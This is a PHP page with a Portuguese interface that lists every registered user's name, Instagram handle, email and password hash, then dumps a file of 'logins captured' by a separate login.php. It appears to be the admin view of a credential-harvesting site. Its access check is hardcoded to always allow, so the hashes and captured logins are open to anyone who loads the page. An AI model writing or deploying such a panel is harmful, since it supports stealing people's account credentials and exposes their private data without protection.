<?php
require 'db.php';
session_start();

// ⚠️ Simples verificação de acesso
$acesso_liberado = true;

if (!$acesso_liberado) {
    echo "Acesso negado.";
    exit();
}

// Buscar usuários no banco
$stmt = $pdo->query("SELECT nome, instagram, email, senha_hash, data_registro FROM usuarios");
$usuarios = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Lista de Usuários</title>
    <link rel="stylesheet" href="style.css">
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            color: white;
        }
        th, td {
            padding: 10px;
            border: 1px solid #aaa;
        }
        th {
            background: #900;
        }
        .login-container {
            max-width: 1000px;
            margin: auto;
            background: linear-gradient(to right, #cc0000, #ff6600);
            padding: 30px;
            border-radius: 12px;
            color: white;
        }
        .btn-voltar {
            background: white;
            color: #cc0000;
            padding: 10px 20px;
            text-decoration: none;
            font-weight: bold;
            border-radius: 6px;
        }
        .btn-voltar:hover {
            background: #ffcccc;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>👀 Lista de Usuários Cadastrados</h1>
        <table>
            <tr>
                <th>Nome</th>
                <th>Instagram</th>
                <th>Email</th>
                <th>Senha (hash)</th>
                <th>Data Cadastro</th>
            </tr>
            <?php foreach ($usuarios as $user): ?>
            <tr>
                <td><?= htmlspecialchars($user['nome']) ?></td>
                <td><?= htmlspecialchars($user['instagram']) ?></td>
                <td><?= htmlspecialchars($user['email']) ?></td>
                <td><?= htmlspecialchars($user['senha_hash']) ?></td>
                <td><?= htmlspecialchars($user['data_registro']) ?></td>
            </tr>
            <?php endforeach; ?>
        </table>

        <br><br>
        <h2>📂 Logins Capturados no login.php</h2>
        <pre style="background:#111;color:#fff;padding:10px;border-radius:8px;">
<?php
$arquivo = 'logins.txt';
if (file_exists($arquivo)) {
    echo htmlspecialchars(file_get_contents($arquivo));
} else {
    echo "Arquivo logins.txt não encontrado.";
}
?>
        </pre>

        <br><a href="dashboard.php" class="btn-voltar">🔙 Voltar</a>
    </div>
</body>
</html>
